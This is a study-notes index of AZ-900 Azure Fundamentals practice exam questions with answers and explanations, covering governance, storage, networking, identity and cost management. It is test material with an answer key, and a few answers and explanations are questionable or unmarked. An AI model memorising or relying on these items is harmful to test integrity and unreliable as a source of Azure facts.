<li>subscriptions</li> </ul> <p>Azure generates separate billing reports and invoices for each subscription so that you can organize and manage costs. Resource groups can be used to group costs, but you will not receive a separate invoice for each resource group. Management groups are used to efficiently manage access, policies, and compliance for subscriptions. You can set up billing profiles to roll up subscriptions into invoice sections, but this requires customization. Describe the core architectural components of Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-19-of-50","title":"Question 19 of 50","text":"<p>Which resource can you use to manage access, policies, and compliance across multiple subscriptions?</p> <ul> <li>management groups</li> </ul> <p>Management groups can be used in environments that have multiple subscriptions to streamline the application of governance conditions. Resource groups can be used to organize Azure resources. A inistrative units are used to delegate the administration of Azure AD resources, such as users and groups. Accounts are used to provide access to resources</p> <p>Describe the core architectural components of Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-20-of-50","title":"Question 20 of 50","text":"<p>Select the answer that correctly completes the sentence.</p> <p>(------Your Answer Here -------)\u00a0is the deployment and management service for Azure.</p> <ul> <li>Azure Resource Manager (ARM)</li> </ul> <p>ARM is the deployment and management service for Azure. It provides a management layer that enables you to create, update, and delete resources in an Azure subscription. You use management features, such as access control, resource locks, and resource tags, to secure and organize resources after deployment. Describe the core architectural components of Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-21-of-50","title":"Question 21 of 50","text":"<p>What can you use to execute code in a serverless environment?</p> <ul> <li>Azure Functions</li> </ul> <p>Azure Functions allows you to run code as a service without having to manage the underlying platform or infrastructure. Azure Logic Apps is similar to Azure Functions, but uses predefined workflows instead of developing your own code. Describe Azure compute and networking services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-22-of-50","title":"Question 22 of 50","text":"<p>What can you use to connect Azure resources, such as Azure SQL databases, to an Azure virtual network?</p> <ul> <li>service endpoints</li> </ul> <p>Service endpoints are used to expose Azure services to a virtual network, providing communication between the two. ExpressRoute is used to connect an on-premises network to Azure. NSGs allow you to configure inbound and outbound rules for virtual networks and virtual machines. Peering allows you to connect virtual networks together. Describe Azure compute and networking services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-23-of-50","title":"Question 23 of 50","text":"<p>Which two services can you use to establish network connectivity between an on-premises network and Azure resources? Each correct answer presents a complete solution.</p> <ul> <li>Azure VPN Gateway</li> <li>ExpressRoute</li> </ul> <p>ExpressRoute connections and Azure VPN Gateway are two services that you can use to connect an on-premises network to Azure. Bastion provides a web interface to remotely administer Azure virtual machines by using SSH/RDP. Azure Firewall is a stateful firewall service used to protect virtual networks. Azure ExpressRoute: Connectivity models | Microsoft Learn. Describe Azure compute and networking services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-24-of-50","title":"Question 24 of 50","text":"<p>Which storage service should you use to store thousands of files containing text and images?</p> <ul> <li>Azure Blob storage</li> </ul> <p>Azure Blob storage is an object storage solution that you can use to store massive amounts of unstructured data, such as text or binary data. Describe Azure storage services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-25-of-50","title":"Question 25 of 50","text":"<p>Which Azure Blob storage tier stores data offline and offers the lowest storage costs and the highest costs to access data?</p> <ul> <li>Archive</li> </ul> <p>The Archive storage tier stores data offline and offers the lowest storage costs, but also the highest costs to rehydrate and access data. The Hot storage tier is optimized for storing data that is accessed frequently. Data in the Cool access tier can tolerate slightly lower availability, but still requires high durability, retrieval latency, and throughput characteristics similar to hot data. Describe Azure storage services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-26-of-50","title":"Question 26 of 50","text":"<p>Which storage service offers fully managed file shares in the cloud that are accessible by using Server Message Block (SMB) protocol?</p> <ul> <li>Azure Files</li> </ul> <p>Azure Files offers fully managed file shares in the cloud with shares that are accessible by using Server Message Block (SMB) protocol. Mounting Azure file shares is just like connecting to shares on a local network. Describe Azure storage services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-27-of-50","title":"Question 27 of 50","text":"<p>Which two scenarios are common use cases for Azure Blob storage? Each correct answer presents a complete solution.</p> <ul> <li>serving images or documents directly to a browser</li> <li>storing data for backup and restore</li> </ul> <p>Low storage costs and unlimited file formats make blob storage a good location to store backups and archives. Blob storage can be reached from anywhere by using an internet connection. Azure Disk Storage provides disks for Azure virtual machines. Azure Files supports mounting file storage shares. Describe Azure storage services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-28-of-50","title":"Question 28 of 50","text":"<p>Which Azure Blob storage service tier has the highest storage costs and the fastest access times for reading and writing data?</p> <ul> <li>Hot</li> </ul> <p>The Hot tier is optimized for storing data that is accessed frequently. The Cool access tier has a slightly lower availability SLA and higher access costs compared to hot data, which are acceptable trade-offs for lower storage costs. Archive storage stores data offline and offers the lowest storage costs, but also the highest costs to rehydrate and access data. Describe Azure storage services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-29-of-50","title":"Question 29 of 50","text":"<p>Which two protocols are used to access Azure file shares? Each correct answer presents a complete solution.</p> <ul> <li>Network File System (NFS)</li> <li>Server Message Block (SMB)</li> </ul> <p>Azure Files offers fully managed file shares in the cloud that are accessible via industry-standard SMB and NFS protocols. Describe Azure storage services - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-30-of-50","title":"Question 30 of 50","text":"<p>What enables a user to sign in one time and use that credential to access multiple resources and applications from different providers?</p> <ul> <li>single sign-on (SSO)</li> </ul> <p>SSO enables a user to sign in one time and use that credential to access multiple resources and applications from different providers. MFA is a process whereby a user is prompted during the sign-in process for an additional form of identification. Conditional Access is a tool that Azure AD uses to allow or deny access to resources based on identity signals. Azure AD supports the registration of devices. Describe Azure identity, access, and security - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-31-of-50","title":"Question 31 of 50","text":"<p>What can you use to allow a user to manage all the resources in a resource group?</p> <ul> <li>Azure role-based access control (RBAC)</li> </ul> <p>Azure RBAC allows you to assign a set of permissions to a user or group. Resource tags are used to locate and act on resources associated with specific workloads, environments, business units, and owners. Resource locks prevent the accidental change or deletion of a resource. Key Vault is a centralized cloud service for storing an application secrets in a single, central location. Describe Azure identity, access, and security - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-32-of-50","title":"Question 32 of 50","text":"<p>Which type of strategy uses a series of mechanisms to slow the advancement of an attack that aims to gain unauthorized access to data?</p> <ul> <li>defense in depth</li> </ul> <p>A defense in depth strategy uses a series of mechanisms to slow the advancement of an attack that aims to gain unauthorized access to data. The principle of least privilege means restricting access to information to only the level that users need to perform their work. A DDoS attack attempts to overwhelm and exhaust an application's resources. The perimeter layer is about protecting an organization's resources from network-based attacks. Describe Azure identity, access, and security - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-33-of-50","title":"Question 33 of 50","text":"<p>Which two services are provided by Azure AD? Each correct answer presents a complete solution.</p> <ul> <li>authentication</li> <li>single sign-on (SSO)</li> </ul> <p>Azure AD provides services for verifying identity and access to applications and resources. SSO enables you to remember a single username and password to access multiple applications and is available in Azure AD. Describe Azure identity, access, and security - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-34-of-50","title":"Question 34 of 50","text":"<p>You have an Azure virtual machine that is accessed only between 9:00 and 17:00 each day.</p> <p>What should you do to minimize costs but preserve the associated hard disks and data?</p> <ul> <li> <p>Resize the virtual machine.   This answer is incorrect.</p> </li> <li> <p>Deallocate the virtual machine. This answer is correct.</p> </li> </ul> <p>If you have virtual machine workloads that are used only during certain periods, but you run them every hour of every day, then you are wasting money. These virtual machines are great candidates to deallocate when not in use and start back when required to save compute costs while the virtual machines are deallocated. Describe cost management in Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-35-of-50","title":"Question 35 of 50","text":"<p>You need to associate the costs of resources to different groups within an organization without changing the location of the resources. What should you use?</p> <ul> <li> <p>subscriptions.  This answer is incorrect.</p> </li> <li> <p>resource tags.  This answer is correct.</p> </li> </ul> <p>Resource tags can be used to group billing data and categorize costs by runtime environment, such as billing usage for virtual machines running in a production environment. Tag resources, resource groups, and subscriptions for logical organization - Azure Resource Manager | Microsoft Learn. Describe the purpose of tags - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-36-of-50","title":"Question 36 of 50","text":"<p>Your organization plans to deploy several production virtual machines that will have consistent resource usage throughout the year. What can you use to minimize the costs of the virtual machines without reducing the functionality of the virtual machines?</p> <ul> <li>Azure Reservations</li> </ul> <p>Azure Reservations offers discounted prices on certain Azure services. Azure Reservations can save you up to 72 percent compared to pay-as-you-go prices. To receive a discount, you can reserve services and resources by paying in advance.Spending limits can suspend a subscription when the spend limit is reached. Describe cost management in Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-37-of-50","title":"Question 37 of 50","text":"<p>What can be applied to a resource to prevent accidental deletion?</p> <ul> <li>a resource lock</li> </ul> <p>A resource lock prevents resources from being accidentally deleted or changed. Resource tags offer the custom grouping of resources. Policies enforce different rules across all resource configurations so that the configurations stay compliant with corporate standards. An initiative is a way of grouping related policies together. Describe features and tools in Azure for governance and compliance - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-38-of-50","title":"Question 38 of 50","text":"<p>You need to recommend a solution for Azure virtual machine deployments. The solution must enforce company standards on the virtual machines. What should you include in the recommendation?</p> <ul> <li> <p>Azure Blueprints. This answer is incorrect.</p> </li> <li> <p>Azure Policy.   This answer is correct. </p> </li> </ul> <p>Azure policies will allow you to enforce company standards on new virtual machines when combined with Azure VM Image Builder and Azure Compute Gallery. By using Azure Policy and role-based access control (RBAC) assignments, enterprises can enforce standards on Azure resources. But on virtual machines, these mechanisms only affect the control plane or the route to the virtual machine. Describe features and tools in Azure for governance and compliance - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-39-of-50","title":"Question 39 of 50","text":"<p>You need to ensure that multi-factor authentication (MFA) is enabled on accounts with write permissions in an Azure subscription. What should you implement?</p> <ul> <li>Azure Policy</li> </ul> <p>Azure Policy is a service in Azure that enables you to create, assign, and manage policies that control or audit resources. Describe features and tools in Azure for governance and compliance - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-40-of-50","title":"Question 40 of 50","text":"<p>What can you use to restrict the deployment of a virtual machine to a specific location?</p> <ul> <li>Azure Policy</li> </ul> <p>Azure Policy can help to create a policy for allowed regions, which enables you to restrict the deployment of virtual machines to a specific location. Overview of Azure Policy - Azure Policy | Microsoft Learn. Describe the purpose of Azure Policy - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-41-of-50","title":"Question 41 of 50","text":"<p>Which management layer accepts requests from any Azure tool or API and enables you to create, update, and delete resources in an Azure account?</p> <ul> <li>Azure Resource Manager (ARM)</li> </ul> <p>ARM is the deployment and management service for Azure. It provides a management layer that enables you to create, update, and delete resources in an Azure account. Describe features and tools for managing and deploying Azure resources - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-42-of-50","title":"Question 42 of 50","text":"<p>What can you use to manage servers across cloud platforms and on-premises environments?</p> <ul> <li>Azure Arc</li> </ul> <p>Azure Arc simplifies governance and management by delivering a consistent multi-cloud and on-premises management platform. Describe features and tools for managing and deploying Azure resources - Training | Microsoft Learn. Describe the purpose of Azure Arc - Training | Microsoft Learn.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-43-of-50","title":"Question 43 of 50","text":"<p>What provides recommendations to reduce the cost of Azure resources?</p> <ul> <li>Azure Advisor</li> </ul> <p>Azure Advisor analyzes the account usage and makes recommendations based on its set and configured rules. Describe monitoring tools in Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-44-of-50","title":"Question 44 of 50","text":"<p>You have a team of Linux administrators that need to manage the resources in Azure. The team wants to use the Bash shell to perform the administration. What should you recommend?</p> <ul> <li>Azure CLI</li> </ul> <p>Azure CLI allows you to use the Bash shell to perform administrative tasks. Bash is used in Linux environments, so a Linux administrator will probably be more comfortable performing command-line administration from Azure CLI. Describe features and tools for managing and deploying Azure resources - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-45-of-50","title":"Question 45 of 50","text":"<p>You need to create a custom solution that uses thresholds to trigger autoscaling functionality to scale an app up or down to meet user demand. What should you include in the solution?</p> <ul> <li> <p>Application insights.  This answer is incorrect.</p> </li> <li> <p>Azure Monitor.  This answer is correct.</p> </li> </ul> <p>Azure Monitor is a platform that collects metric and logging data, such as CPU percentages. The data can be used to trigger autoscaling. Describe monitoring tools in Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-46-of-50","title":"Question 46 of 50","text":"<p>What should you proactively review and act on to avoid service interruptions, such as service retirements and breaking changes?</p> <ul> <li> <p>Azure Monitor. This answer is incorrect.</p> </li> <li> <p>health advisories. This answer is correct.</p> </li> </ul> <p>Health advisories are issues that require that you take proactive action to avoid service interruptions, such as service retirements and breaking changes. Service issues are problems such as outages that require immediate actions. Describe monitoring tools in Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-47-of-50","title":"Question 47 of 50","text":"<p>What can you use to get notification about an outage in a specific Azure region?</p> <ul> <li>Azure Service Health</li> </ul> <p>Service Health notifies you of Azure-related service issues, such as region-wide downtime. Describe monitoring tools in Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-48-of-50","title":"Question 48 of 50","text":"<p>Which Azure service can generate an alert if virtual machine utilization is over 80% for five minutes?</p> <ul> <li>Azure Monitor</li> </ul> <p>Azure Monitor is a platform for collecting, analyzing, visualizing, and alerting based on metrics. Azure Monitor can log data from an entire Azure and on-premises environment. Describe monitoring tools in Azure - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-49-of-50","title":"Question 49 of 50","text":"<p>What can you apply to an Azure virtual machine to ensure that users cannot change or delete the resource?</p> <ul> <li>a lock</li> </ul> <p>Protect your Azure resources with a lock - Azure Resource Manager | Microsoft Learn Describe features and tools in Azure for governance and compliance - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-50-of-50","title":"Question 50 of 50","text":"<p>Which feature in the Microsoft Purview governance portal should you use to manage access to data sources and datasets?</p> <p>Your Answer: </p> <ul> <li>Data Estate Insights. This answer is incorrect.</li> <li>Data Policy. This answer is correct.</li> </ul> <p>Incorrect: Data Catalog \u2013\u2013 This enables data discovery. Incorrect: Data Sharing \u2013\u2013 This shares data within and between organizations. Incorrect: Data Estate Insights \u2013\u2013 This accesses data estate health. Correct: Data Policy \u2013\u2013 This governs access to data.</p> <p>Introduction to Microsoft Purview governance solutions - Microsoft Purview | Microsoft Learn. Describe features and tools in Azure for governance and compliance - Training | Microsoft Learn</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#exams-from-course-az-900-microsoft-azure-fundamentals-original-practice-tests","title":"Exams from \"Course AZ-900: Microsoft Azure Fundamentals Original Practice Tests\"","text":"<p>Exams from the Udemy course AZ-900: Microsoft Azure Fundamentals Original Practice Tests.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#test-1","title":"Test 1","text":"","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-1-which-azure-feature-is-specifically-designed-to-help-companies-get-their-in-house-developed-code-from-the-code-repository-through-automated-unit-testing-and-onto-azure-using-a-service-called-pipelines","title":"Question 1:\u00a0Which Azure feature is specifically designed to help companies get their in-house developed code from the code repository, through automated unit testing, and onto Azure using a service called Pipelines?","text":"<ul> <li>Azure Monitor</li> <li>GitHub</li> <li>Azure DevOps</li> <li>Virtual Machines</li> </ul> <p>Explanation: Azure DevOps contains many services, one of which is Pipelines. Pipelines allows you to build an automation that moves code (and all related dependencies) through various stages from the development environment into deployment.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-2-true-or-false-there-are-no-service-level-guarantees-sla-when-a-service-is-in-general-availability-ga","title":"Question 2: True or false: there are no service level guarantees (SLA) when a service is in General Availability (GA)","text":"<ul> <li>FALSE</li> <li>TRUE</li> </ul> <p>Explanation: False, most Azure GA services do have service level agreements. See:\u00a0https://azure.microsoft.com/en-ca/support/legal/sla/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-3-which-ways-does-the-azure-resource-manager-model-provide-to-deploy-resources","title":"Question 3:\u00a0Which ways does the Azure Resource Manager model provide to deploy resources?","text":"<ul> <li>CLI</li> <li>Powershell</li> <li>Azure Portal</li> <li>REST API / SDK</li> </ul> <p>Explanation: Azure Resource Manager (ARM) is the deployment and management service for Azure. It provides a management layer that enables you to create, update, and delete resources in your Azure account. The ARM model allows you to work with resources in a consistent manner, whether through Azure portal, PowerShell, REST APIs/SDKs, or the Command-Line Interface (CLI).</p> <ol> <li> <p>Azure Portal: This is a web-based, unified console that provides an alternative to command-line tools. You can manage your Azure resources directly through a GUI.</p> </li> <li> <p>PowerShell: Azure PowerShell is a module that provides cmdlets to manage Azure through Windows PowerShell and PowerShell Core. You can use it to build scripts for managing and automating your Azure resources.</p> </li> <li> <p>REST API / SDK: Azure provides comprehensive REST APIs that can be used directly or via Azure SDKs available in multiple languages. This allows developers to integrate Azure services in their applications, services, or tools.</p> </li> <li> <p>CLI: Azure CLI is a cross-platform command-line program that connects to Azure and executes administrative commands on Azure resources. It's designed to make scripting easy, authenticate with Azure platform, and quickly run commands to perform common administrative tasks or deploy to Azure.</p> </li> </ol> <p>Each of these methods supports the full set of Azure Resource Manager features, and you can choose the one that best fits your workflow. See:\u00a0https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-4-what-type-of-container-is-used-to-collect-log-and-metric-data-from-various-azure-resources","title":"Question 4: What type of container is used to collect log and metric data from various Azure Resources?","text":"<ul> <li>Log Analytics Workspace</li> <li>Managed Storage</li> <li>Append Blob Storage</li> <li>Azure Monitor account</li> </ul> <p>Explanation: Log Analytics Workspace is required to collect logs and metrics. See:\u00a0https://docs.microsoft.com/en-us/azure/azure-monitor/platform/manage-access</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-5-which-azure-service-is-meant-to-be-a-security-dashboard-that-contains-all-the-security-and-threat-protection-in-one-place","title":"Question 5:\u00a0Which Azure service is meant to be a security dashboard that contains all the security and threat protection in one place?","text":"<ul> <li>Azure Portal Dashboard    </li> <li>Azure Security Center</li> <li>Azure Key Vault  </li> <li>Azure Monitor</li> </ul> <p>Explanation: Azure Security Center - unified security management and threat protection; a security dashboard inside Azure Portal. See:\u00a0https://azure.microsoft.com/en-us/services/security-center/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-6-what-is-a-ddos-attack","title":"Question 6: What is a DDoS attack?","text":"<ul> <li>A denial of service attack that sends so much traffic to a network that it cannot respond fast enough; legitimate users become unable to use the service</li> <li>An attempt to read the contents of a web page from another website, thereby stealing the user's private information</li> <li>An attempt to send SQL commands to the server in a way that it will execute them against the database</li> <li>An attempt to guess a user's password through brute force methods</li> </ul> <p>Explanation: Distributed Denial of Service attacks (DDoS) -a type of attack that originates from the Internet that attempts to overwhelm a network with millions of packets of bad traffic that aims to prevent legitimate traffic from getting through. See:\u00a0https://docs.microsoft.com/en-us/azure/virtual-network/ddos-protection-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-7-in-the-context-of-cloud-computing-and-azure-services-how-would-you-define-compute-resources","title":"Question 7:\u00a0In the context of cloud computing and Azure services, how would you define 'compute resources'?","text":"<ul> <li>They include all resources listed in the Azure Marketplace.</li> <li>They are resources that execute tasks requiring CPU cycles.</li> <li>They refer exclusively to Virtual Machines.</li> <li>They encompass Virtual Machines, Storage Accounts, and Virtual Networks.</li> </ul> <p>Explanation: The correct answer is \"They are resources that execute tasks requiring CPU cycles\". In cloud computing, the term \"compute\" refers to the amount of computational power required to process a task - essentially, it's anything that uses processing power (CPU cycles) to perform operations. This includes, but is not limited to, running applications, executing scripts, and processing data. While virtual machines (VMs) are a common type of compute resource, they are not the only type. Azure offers a wide variety of compute resources, like Azure Functions for serverless computing, Azure Kubernetes Service for container-based applications, and Azure Batch for parallel and high-performance computing tasks. So, the definition of compute resources is broader than just VMs or certain resources listed in the Azure Marketplace. It also includes more than VMs, Storage Accounts, and Virtual Networks, as these other resources (storage and networking) have distinct roles separate from the compute resources. Storage accounts deal with data storage while virtual networks are concerned with networking aspects in Azure, not with performing tasks that require CPU cycles. Therefore, \"They are resources that execute tasks requiring CPU cycles\" is the most accurate answer. See:\u00a0https://azure.microsoft.com/en-us/product-categories/compute/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-8-which-azure-service-contains-pre-built-machine-learning-models-that-you-can-use-in-your-own-code-using-an-api","title":"Question 8:\u00a0Which\u00a0Azure Service contains pre-built machine learning models that you can use in your own code, using an API?","text":"<ul> <li>Cognitive Services</li> <li>Azure Functions</li> <li>Azure Blueprints</li> <li>App Services</li> </ul> <p>Explanation: Cognitive Services is an API that Azure provides, that gives access to a set of pre-built machine learning models including vision services, speech services, knowledge management and chat bots.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-9-in-microsoft-azure-what-is-the-maximum-number-of-virtual-machines-that-can-be-included-in-a-single-virtual-machine-scale-set-as-per-azures-standard-guidelines-and-capabilities","title":"Question 9: In Microsoft Azure, what is the maximum number of virtual machines that can be included in a single Virtual Machine Scale Set, as per Azure's standard guidelines and capabilities?","text":"<ul> <li>10000</li> <li>1000</li> <li>Unlimited</li> <li>500</li> </ul> <p>Explanation: The correct answer is 1000. Azure Virtual Machine Scale Sets are a service provided by Azure that allows you to manage, scale, and distribute large numbers of identical virtual machines. As per the limitations set by Microsoft Azure, a single Virtual Machine Scale Set can support up to 1000 VM instances. This capacity allows for high availability and network load balancing across a large number of virtual machines, providing a robust and efficient solution for applications that require heavy compute resources. However, if you are using custom VM images, this limit decreases to 600 instances. This functionality is part of Azure's Infrastructure as a Service (IaaS) offerings, providing flexibility and scalability to businesses and developers. See:\u00a0https://docs.microsoft.com/en-us/azure/virtual-machine-scale-sets/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-10-what-feature-within-azure-will-make-recommendations-to-you-about-reducing-cost-on-your-account","title":"Question 10:\u00a0What feature within Azure will make recommendations to you about reducing cost on your account?","text":"<ul> <li>Azure Service Health</li> <li>Azure Security Center</li> <li>Azure Advisor</li> <li>Azure Dashboard  </li> </ul> <p>Explanation: Azure Advisor analyzes your account usage and makes recommendations for you based on its set rules. See:\u00a0https://docs.microsoft.com/en-us/azure/advisor/advisor-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-11-your-organization-has-implemented-an-azure-policy-that-restricts-the-type-of-virtual-machine-instances-you-can-use-how-can-you-create-a-vm-that-is-blocked-by-the-policy","title":"Question 11: Your organization has implemented an Azure Policy that restricts the type of Virtual Machine instances you can use. How can you create a VM that is blocked by the policy?","text":"<ul> <li>Use an account that has Contributor or above permissions to the resource group</li> <li>Subscription Owners (Administrators) can create resources regardless of what the policy restricts</li> <li>The only way is to remove the policy, create the resource and add the policy back</li> </ul> <p>Explanation:  You cannot perform a task that violates policy, so you have to remove the policy in order to perform the task. See:\u00a0https://docs.microsoft.com/en-us/azure/governance/policy/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-12-you-have-decided-to-subscribe-to-azure-ddos-protection-at-the-ip-protection-tier-this-provides-advanced-protection-to-defend-against-ddos-attacks-what-type-of-ddos-attack-does-ddos-protection-not-protect-against","title":"Question 12:\u00a0You have decided to subscribe to Azure DDoS\u00a0Protection at the IP Protection Tier. This provides advanced protection to defend against DDoS attacks. What type of DDoS attack does DDoS Protection NOT\u00a0protect against?","text":"<ul> <li>Transport (L4)\u00a0level attacks</li> <li>Application (L7) level attacks</li> <li>Network (L3)\u00a0level attacks</li> </ul> <p>Explanation: The correct answer is \"Application level attacks\": </p> <ul> <li> <p>Network-level attacks\u00a0are attacks that target the network infrastructure, such as the routers and switches that connect your Azure resources to the internet. Azure DDoS Protection IP Protection Tier can protect against network-level attacks by absorbing and rerouting excessive traffic, and by scrubbing malicious traffic.</p> </li> <li> <p>Transport-level attacks\u00a0are attacks that target the transport layer of the network protocol stack, such as TCP and UDP. Azure DDoS Protection IP Protection Tier can protect against transport-level attacks by absorbing and rerouting excessive traffic, and by scrubbing malicious traffic.</p> </li> <li> <p>Application-level attacks\u00a0are attacks that target the application layer of the network protocol stack, such as HTTP and DNS. Azure DDoS Protection IP Protection Tier\u00a0does not\u00a0protect against application-level attacks, because it is designed to protect against network and transport-level attacks.</p> </li> </ul> <p>To protect against application-level attacks, you need to use a web application firewall (WAF). A WAF is a software appliance that sits in front of your application and filters out malicious traffic. WAFs can be configured to protect against a wide variety of application-level attacks, such as SQL injection, cross-site scripting, and denial of service attacks. See:\u00a0https://docs.microsoft.com/en-us/azure/virtual-network/ddos-protection-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-13-which-of-the-following-characteristics-of-a-cloud-based-system-primarily-contributes-to-its-elasticity","title":"Question 13: Which of the following characteristics of a cloud-based system primarily contributes to its elasticity?","text":"<ul> <li>The system's ability to recover automatically after a crash.</li> <li>The system's ability to dynamically increase and decrease capacity based on real-time demand.</li> <li>The system's ability to maintain availability while updates are being implemented.</li> <li>The system's ability to withstand denial-of-service attacks.</li> </ul> <p>Explanation:  The correct answer is \"The ability to increase and reduce capacity based on actual demand.\" This characteristic refers to the concept of\u00a0elasticity\u00a0in cloud computing. An elastic system\u00a0is one that can automatically adjust its resources\u00a0(compute, storage, etc.) in response to changing workloads and demands. This is done to ensure optimal performance and cost-effectiveness. When demand increases, the system can scale out by adding more resources, and when demand decreases, it can scale in by reducing resources, all without significant manual intervention. The other options, while important for overall system robustness, do not define elasticity. Withstanding denial of service attacks pertains to security, maintaining availability during updates refers to zero-downtime deployment or high availability, and self-healing after a crash refers to resilience or fault tolerance. None of these are about dynamically adjusting capacity based on demand, which is the hallmark of an elastic system. See:\u00a0https://azure.microsoft.com/en-us/overview/what-is-elastic-computing/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-14-logic-apps-functions-and-service-fabric-are-all-examples-of-what-model-of-compute-within-azure","title":"Question 14:\u00a0Logic apps, functions, and service fabric are all examples of what model of compute within Azure?","text":"<ul> <li>SaaS model</li> <li>App Services Model</li> <li>IaaS model</li> <li>Serverless model</li> </ul> <p>Explanation: The correct answer is the Serverless model. Azure Logic Apps, Azure Functions, and Azure Service Fabric are all examples of serverless computing in Azure. Serverless computing is a cloud computing model where the cloud provider automatically manages the provisioning and allocation of servers, hence the term \"serverless\". The serverless model allows developers to focus on writing the code and business logic rather than worrying about the underlying infrastructure, its setup, maintenance, scaling, and capacity planning. </p> <ul> <li>Azure Logic Apps is a cloud service that allows developers to build workflows that integrate apps, data, services, and systems. </li> <li>Azure Functions is an event-driven, compute-on-demand experience that extends the existing Azure application platform with capabilities to implement code triggered by events occurring in Azure or third-party services. </li> <li>Azure Service Fabric is a distributed systems platform that makes it easy to package, deploy, and manage scalable and reliable microservices.</li> </ul> <p>In contrast, IaaS (Infrastructure as a Service) refers to cloud-based services where you rent IT infrastructure\u2014servers and virtual machines (VMs), storage, networks, and operating systems\u2014from a cloud provider on a pay-as-you-go basis. SaaS (Software as a Service) is a software distribution model in which a third-party provider hosts applications and makes them available to customers over the Internet, which doesn't align with the services mentioned in the question. The App Services model is a platform for hosting web applications, REST APIs, and mobile backends, but it's not strictly serverless as it doesn't auto-scale in the same way. 